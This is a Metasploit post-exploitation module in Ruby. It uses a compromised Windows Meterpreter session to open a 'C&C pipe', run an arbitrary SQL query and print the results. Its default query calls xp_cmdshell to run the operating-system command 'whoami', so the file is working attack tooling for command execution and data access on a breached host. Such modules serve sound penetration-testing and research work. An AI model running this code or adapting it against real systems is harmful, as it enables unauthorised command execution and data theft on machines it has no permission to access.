##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/project_mayhem'
require 'rex/ui/text/table'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::ProjectMayhem

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Execute an arbitrary SQL Query',
			'Description'    => %q{
				Execute an arbitrary SQL Query
			},
			'Author'        => 'Spencer McIntyre',
			'License'       => MSF_LICENSE,
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
		register_options(
			[
				OptString.new('QUERY', [ true,  "SQL Query To Execute", 'EXEC master..xp_cmdshell \'whoami\'']),
			], self.class)
		deregister_options('VENDORID')
	end


	def run
		connect
		print_good("Opened a handle to the C&C pipe")

		begin
			result = execute_query(datastore['QUERY'])
		rescue RuntimeError => ex
			print_error(ex.message)
			result = nil
		else
			print_good("Command completed successfully!")
		ensure
			disconnect
		end
		return if result == nil
		checkbook_table = Rex::Ui::Text::Table.new(
			'Header'    => 'Query Results',
			'Indent'    => 2,
			'Columns'   => result['names'],
			'SortIndex' => -1
		)

		result['values'].each do |row|
			checkbook_table << row
		end

		print_line(checkbook_table.to_s)
	end
end
